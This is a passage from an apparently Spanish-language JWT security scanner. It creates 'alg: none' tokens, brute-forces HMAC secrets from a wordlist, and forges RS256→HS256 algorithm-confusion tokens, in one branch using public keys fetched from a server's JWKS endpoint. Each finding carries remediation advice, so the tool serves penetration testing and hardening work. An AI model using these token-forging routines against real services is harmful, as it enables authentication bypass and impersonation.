                        "Si el token procede de un flujo implícito, migrar al flujo de código "
                        "de autorización con PKCE (response_type=code + code_challenge).\n"
                        "Ref: RFC 9700 §2.1.2 — el flujo implícito está desaconsejado"
                    ),
                ))
        except (TypeError, ValueError):
            pass

    result.alg_none_token = craft_alg_none_token(components)

    alg = components.header.get("alg", "").upper()
    if alg.startswith("HS"):
        cracked = brute_force_secret(components, extra_wordlist=wordlist)
        if cracked is not None:
            result.cracked_secret = cracked
            result.findings.append(Finding(
                severity    = "CRITICAL",
                title       = f"Secreto HMAC descubierto por fuerza bruta: {cracked!r}",
                description = f"El secreto del token HS256/HS384/HS512 ha sido recuperado mediante "
                              f"un ataque de diccionario. Secreto: {cracked!r}. "
                              "Cualquier atacante con el token puede forjar nuevos tokens arbitrarios.",
                evidence    = f"Secreto: {cracked!r}  Algoritmo: {alg}",
                remediation = "Cambiar el secreto inmediatamente por uno aleatorio de alta entropía "
                              "(mínimo 32 bytes = 256 bits). "
                              "Invalidar todos los tokens emitidos con el secreto comprometido. "
                              "Rotación del secreto requiere reinicio del servicio o recarga de configuración.",
            ))

    if pubkey_pem and alg in ("RS256", "RS384", "RS512"):
        manipulated = craft_rs256_hs256_token(components, pubkey_pem)
        if manipulated:
            result.rs256_hs256_token = manipulated
            result.findings.append(Finding(
                severity    = "HIGH",
                title       = "Token RS256→HS256 manipulado generado",
                description = "Se ha generado un token HS256 firmado con la clave pública RSA como secreto. "
                              "Si el servidor acepta este token, es vulnerable al ataque de confusión de algoritmo.",
                evidence    = f"Token manipulado: {manipulated[:80]}...",
                remediation = "Fijar el algoritmo aceptado en el servidor (sólo RS256, nunca HS256 con la misma clave). "
                              "Usar la opción 'algorithms=[\"RS256\"]' en la librería JWT del servidor.",
            ))

    if alg in ("RS256", "RS384", "RS512"):
        _iss_str = str(components.payload.get("iss", ""))
        _jwks_source = jwks_url
        if not _jwks_source and _iss_str.startswith("http"):
            _jwks_source = _iss_str
        if _jwks_source:
            _fetched_pem = fetch_jwks_public_key(_jwks_source)
            if _fetched_pem:
                result.jwks_pubkey_pem = _fetched_pem
                _jwks_token = craft_rs256_hs256_token(components, _fetched_pem)
                if _jwks_token:
                    result.jwks_rs256_hs256_token = _jwks_token
                    result.findings.append(Finding(
                        severity    = "CRITICAL",
                        title       = "[JWT-CONF-010] Confusión RS256→HS256 con clave pública JWKS real",
                        description = (
                            "Se ha obtenido la clave pública RSA del servidor mediante el JWKS "
                            "y se ha generado un token HS256 firmado con ella como secreto HMAC. "
                            "Si el servidor acepta este token, la vulnerabilidad de confusión de "
                            "algoritmo queda CONFIRMADA (CVE-2026-22817 cluster): cualquier atacante "
                            "puede forjar tokens arbitrarios usando únicamente la clave pública conocida."
                        ),
                        evidence    = (
                            f"JWKS source: {_jwks_source}\n"
                            f"Token generado: {_jwks_token[:80]}..."
                        ),
                        remediation = (
                            "Fijar el algoritmo JWT aceptado en el servidor (solo RS256, "
                            "rechazar HS256 explícitamente en la misma instancia de validación).\n"
                            "Actualizar la librería JWT a una versión que prevenga la confusión "
                            "de algoritmo asimétrico/simétrico.\n"
                            "Ref: CVE-2026-22817"
                        ),
                    ))

    _iss_str7 = str(components.payload.get("iss", ""))
    _chk_url  = jwks_url or (_iss_str7 if _iss_str7.startswith("http") else None)
    if _chk_url or any(s in _iss_str7.lower() for s in ("vault", "openbao", "/auth/")):
        result.findings.extend(
            detect_vulnerable_frameworks(components, check_url=_chk_url)
        )

    result.findings.sort(key=lambda f: f.order)
    return result
